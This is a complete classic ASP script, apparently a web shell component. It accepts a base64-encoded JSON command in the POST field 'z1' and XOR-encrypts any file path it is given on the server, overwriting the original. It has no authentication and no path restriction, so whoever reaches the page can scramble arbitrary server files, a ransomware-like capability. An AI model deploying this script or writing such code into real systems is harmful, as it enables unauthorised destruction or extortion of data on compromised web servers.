<%

Response.CharSet = "utf-8"
Response.ContentType = "text/plain"

Function Base64Decode(ByVal vIn)
    Dim oXML, oNode
    Set oXML = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vIn
    Base64Decode = Stream_BinaryToString(oNode.nodeTypedValue)
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_BinaryToString(ByVal Binary)
    Dim oStream
    Set oStream = Server.CreateObject("ADODB.Stream")
    oStream.Type = 1
    oStream.Open
    oStream.Write Binary
    oStream.Position = 0
    oStream.Type = 2
    oStream.Charset = "utf-8"
    Stream_BinaryToString = oStream.ReadText
    oStream.Close
    Set oStream = Nothing
End Function

Function XorTransformFile(filePath, key)
    Dim stream, bytes, i, keyLen, uBoundBytes, kChar, fso
    On Error Resume Next
    
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    If Not fso.FileExists(filePath) Then
        XorTransformFile = Array(False, "File not found or permission denied")
        Exit Function
    End If
    Set fso = Nothing

    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' Binary
    stream.Open
    stream.LoadFromFile filePath
    If Err.Number <> 0 Then
        XorTransformFile = Array(False, "Failed to read file: " & Err.Description)
        Exit Function
    End If
    
    bytes = stream.Read
    stream.Close
    
    keyLen = Len(key)
    If keyLen = 0 Then
        XorTransformFile = Array(False, "XOR Key cannot be empty")
        Exit Function
    End If
    
    uBoundBytes = UBound(bytes)
    For i = 0 To uBoundBytes
        kChar = Asc(Mid(key, (i Mod keyLen) + 1, 1))
        bytes(i) = bytes(i) Xor kChar
    Next
    
    stream.Open
    stream.Write bytes
    stream.SaveToFile filePath, 2 ' Overwrite
    stream.Close
    Set stream = Nothing
    
    If Err.Number <> 0 Then
        XorTransformFile = Array(False, "Failed to write file: " & Err.Description)
        Exit Function
    End If
    
    XorTransformFile = Array(True, "XOR transformation applied successfully")
End Function

Function ExtractJsonValue(jsonStr, keyName)
    Dim p1, p2
    p1 = InStr(jsonStr, """" & keyName & """")
    If p1 > 0 Then
        p1 = InStr(p1, jsonStr, ":")
        If p1 > 0 Then
            p1 = InStr(p1, jsonStr, """")
            If p1 > 0 Then
                p2 = InStr(p1 + 1, jsonStr, """")
                If p2 > p1 Then
                    ExtractJsonValue = Mid(jsonStr, p1 + 1, p2 - p1 - 1)
                    Exit Function
                End If
            End If
        End If
    End If
    ExtractJsonValue = ""
End Function

Sub Main()
    Dim z1, configRaw, action, key, target, fullPath
    z1 = Request.Form("z1")
    
    If z1 = "" Then
        Response.Write "[{""file"":""ERROR"",""action"":""NONE"",""status"":false,""details"":""Missing parameter z1""}]"
        Exit Sub
    End If
    
    On Error Resume Next
    configRaw = Base64Decode(z1)
    If Err.Number <> 0 Or configRaw = "" Then
        configRaw = z1
    End If
    On Error Goto 0
    
    action = ExtractJsonValue(configRaw, "action")
    key = ExtractJsonValue(configRaw, "key")
    target = ExtractJsonValue(configRaw, "target")
    
    If target = "" Then
        Response.Write "[{""file"":""ERROR"",""action"":""" & action & """,""status"":false,""details"":""Target path is empty""}]"
        Exit Sub
    End If
    
    Dim fso
    Set fso = Server.CreateObject("Scripting.FileSystemObject")
    fullPath = target
    If Not fso.FileExists(fullPath) Then
        Dim altPath
        altPath = Server.MapPath(target)
        If fso.FileExists(altPath) Then
            fullPath = altPath
        End If
    End If
    Set fso = Nothing
    
    Dim res
    res = XorTransformFile(fullPath, key)
    
    Response.Write "[{""file"":""" & Replace(fullPath, "\", "\\") & """,""action"":""" & action & """,""status"":" & LCase(CStr(res(0))) & ",""details"":""" & Replace(res(1), """", "\""") & """}]"
End Sub

Main()

%>